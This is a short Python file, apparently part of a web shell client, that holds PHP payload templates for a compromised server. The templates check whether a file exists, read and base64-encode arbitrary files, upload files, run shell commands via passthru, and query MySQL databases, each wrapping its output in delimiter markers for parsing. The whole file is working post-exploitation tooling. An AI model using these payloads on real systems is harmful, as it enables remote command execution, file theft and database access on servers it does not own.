#author:xbillow

class Payloads:

    fileExists='''
    echo('*-*-*-*-*-*-*-*-*-*');
    if(!file_exists('{}'))
        echo "false";
    else
        echo "true";
    echo('*-*-*-*-*-*-*-*-*-*');
    exit();
    '''
    fileDownload='''
    echo('*-*-*-*-*-*-*-*-*-*');
    echo base64_encode(file_get_contents('{}'));
    echo('*-*-*-*-*-*-*-*-*-*');
    exit();
    '''
    fileUpload='''
    file_put_contents('{path}',base64_decode(str_replace(' ',chr(43),'{content}')));
    echo('*-*-*-*-*-*-*-*-*-*');
    echo 'OK';
    echo('*-*-*-*-*-*-*-*-*-*');
    exit();
    '''
    syscmd='''echo('*-*-*-*-*-*-*-*-*-*');passthru('{}');echo('*-*-*-*-*-*-*-*-*-*');exit();'''

    sqlExec='''
    echo('*-*-*-*-*-*-*-*-*-*');
    $conn = mysqli_connect("{host}","{user}","{passwd}","{db}",{port});
    if(!$conn) echo("[-]Error:Can't connect the database.");
    $query = "{sql}";
    $result = mysqli_query($conn,$query);
    if($row = mysqli_fetch_array($result,MYSQLI_ASSOC))
    {{{{{{{{
        foreach($row as $key=>$value)
            echo $key.",";
        echo "\\n";
        foreach($row as $key=>$value)
            echo $value.",";
        echo "\\n";
    }}}}}}}}
    while($row = mysqli_fetch_array($result,MYSQLI_ASSOC)) 
    {{{{{{{{
        foreach($row as $key=>$value)
            echo $value.",";
        echo "\\n";
    }}}}}}}}
    echo('*-*-*-*-*-*-*-*-*-*');
    exit();
    '''

